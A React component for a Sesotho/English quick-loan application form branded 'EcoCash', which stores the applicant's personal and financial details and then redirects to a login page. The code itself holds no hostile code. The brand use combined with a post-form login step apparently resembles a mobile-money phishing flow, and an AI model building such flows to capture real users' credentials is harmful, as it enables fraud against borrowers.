import { useState, FormEvent } from 'react'

interface FormData {
  name: string
  phone: string
  occupation: string
  monthlyIncome: string
  amount: string
  duration: string
}

interface LoanFormProps {
  onSubmitSuccess: () => void
}

const LoanForm = ({ onSubmitSuccess }: LoanFormProps) => {
  const [formData, setFormData] = useState<FormData>({
    name: '',
    phone: '',
    occupation: '',
    monthlyIncome: '',
    amount: '',
    duration: ''
  })
  const [loading, setLoading] = useState(false)
  const [message, setMessage] = useState<{ type: 'success' | 'error', text: string } | null>(null)

  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setMessage(null)

    // Simulate form validation
    setTimeout(() => {
      if (formData.name && formData.phone && formData.occupation && formData.monthlyIncome && formData.amount && formData.duration) {
        // Store form data in sessionStorage for later submission
        sessionStorage.setItem('loanFormData', JSON.stringify(formData))
        // Move to login page for verification
        onSubmitSuccess()
      } else {
        setMessage({ type: 'error', text: 'Please fill all fields / Kenya lintlha tsohle' })
        setLoading(false)
      }
    }, 500)
  }

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    })
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-900 via-purple-800 to-indigo-900 py-12 px-4 sm:px-6 lg:px-8">
      <div className="max-w-md mx-auto">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-5xl font-extrabold mb-2">
            <span className="text-white">Eco</span>
            <span className="text-red-600">Cash</span>
          </h1>
          <p className="text-white text-xl font-medium tracking-wide">Kadimo - Lesotho</p>
          <div className="mt-4 flex items-center justify-center gap-2 text-white">
            <i className="fas fa-money-bill-wave"></i>
            <span className="text-lg">Kopo ea Kadimo ea Potlako</span>
          </div>
          <p className="text-white/80 text-sm mt-2">Quick Loan Application</p>
        </div>

        {/* Form Card */}
        <div className="bg-white rounded-2xl shadow-2xl p-8">
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Name Field */}
            <div>
              <label htmlFor="name" className="block text-sm font-medium text-gray-700 mb-2">
                <i className="fas fa-user mr-2 text-purple-600"></i>
                Lebitso la Hau (Your Full Name)
              </label>
              <input
                type="text"
                id="name"
                name="name"
                required
                value={formData.name}
                onChange={handleChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent transition-all duration-200"
                placeholder="Kenya lebitso la hau le felletseng"
              />
            </div>

            {/* Phone Field */}
            <div>
              <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-2">
                <i className="fas fa-phone mr-2 text-purple-600"></i>
                Nomoro ea Mohala (Phone Number)
              </label>
              <input
                type="tel"
                id="phone"
                name="phone"
                required
                value={formData.phone}
                onChange={handleChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent transition-all duration-200"
                placeholder="+266 XXXX XXXX"
              />
            </div>

            {/* Occupation Field */}
            <div>
              <label htmlFor="occupation" className="block text-sm font-medium text-gray-700 mb-2">
                <i className="fas fa-briefcase mr-2 text-purple-600"></i>
                U Etsa Eng? (What Do You Do For a Living?)
              </label>
              <select
                id="occupation"
                name="occupation"
                required
                value={formData.occupation}
                onChange={handleChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent transition-all duration-200"
              >
                <option value="">Khetha mosebetsi (Select occupation)</option>
                <option value="employed">Mosebeletsi oa Sechaba (Employed)</option>
                <option value="self-employed">Nka Itšebeletsa (Self-Employed)</option>
                <option value="business">Khoebo (Business Owner)</option>
                <option value="farmer">Molemisi (Farmer)</option>
                <option value="student">Moithuti (Student)</option>
                <option value="retired">Motho ea Khutlileng (Retired)</option>
                <option value="other">Tse ling (Other)</option>
              </select>
            </div>

            {/* Monthly Income Field */}
            <div>
              <label htmlFor="monthlyIncome" className="block text-sm font-medium text-gray-700 mb-2">
                <i className="fas fa-money-bill-wave mr-2 text-purple-600"></i>
                Chelete ea Khoeli le Khoeli (Monthly Income)
              </label>
              <input
                type="number"
                id="monthlyIncome"
                name="monthlyIncome"
                required
                min="1"
                value={formData.monthlyIncome}
                onChange={handleChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent transition-all duration-200"
                placeholder="Kenya chelete ea khoeli le khoeli (LSL)"
              />
            </div>

            {/* Amount Field */}
            <div>
              <label htmlFor="amount" className="block text-sm font-medium text-gray-700 mb-2">
                <i className="fas fa-dollar-sign mr-2 text-purple-600"></i>
                Chelete ea Kadimo (Loan Amount)
              </label>
              <input
                type="number"
                id="amount"
                name="amount"
                required
                min="1"
                value={formData.amount}
                onChange={handleChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent transition-all duration-200"
                placeholder="Kenya chelete ka Maloti (LSL)"
              />
            </div>

            {/* Duration Field */}
            <div>
              <label htmlFor="duration" className="block text-sm font-medium text-gray-700 mb-2">
                <i className="fas fa-calendar-alt mr-2 text-purple-600"></i>
                Nako ea ho Lefa (Repayment Period)
              </label>
              <select
                id="duration"
                name="duration"
                required
                value={formData.duration}
                onChange={handleChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-purple-600 focus:border-transparent transition-all duration-200"
              >
                <option value="">Khetha nako (Select duration)</option>
                <option value="1">Khoeli e 1 (1 Month)</option>
                <option value="3">Likhoeli tse 3 (3 Months)</option>
                <option value="6">Likhoeli tse 6 (6 Months)</option>
                <option value="12">Selemo se 1 (12 Months)</option>
                <option value="24">Lilemo tse 2 (24 Months)</option>
              </select>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={loading}
              className="w-full bg-gradient-to-r from-purple-600 to-indigo-600 text-white font-bold py-3 px-6 rounded-lg hover:from-purple-700 hover:to-indigo-700 focus:outline-none focus:ring-2 focus:ring-purple-500 focus:ring-offset-2 transition-all duration-200 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {loading ? (
                <>
                  <i className="fas fa-spinner fa-spin"></i>
                  <span>E Romela... (Submitting)</span>
                </>
              ) : (
                <>
                  <i className="fas fa-paper-plane"></i>
                  <span>Romela Kopo (Submit Application)</span>
                </>
              )}
            </button>
          </form>

          {/* Message Display */}
          {message && (
            <div className={`mt-4 p-4 rounded-lg ${
              message.type === 'success' ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'
            }`}>
              <div className="flex items-center gap-2">
                <i className={`fas ${message.type === 'success' ? 'fa-check-circle' : 'fa-exclamation-circle'}`}></i>
                <span>{message.text}</span>
              </div>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="mt-6 text-center text-white text-sm">
          <p className="flex items-center justify-center gap-2">
            <i className="fas fa-shield-alt"></i>
            <span>Sireletseha le Sephiri (Secure & Confidential)</span>
          </p>
        </div>
      </div>
    </div>
  )
}

export default LoanForm
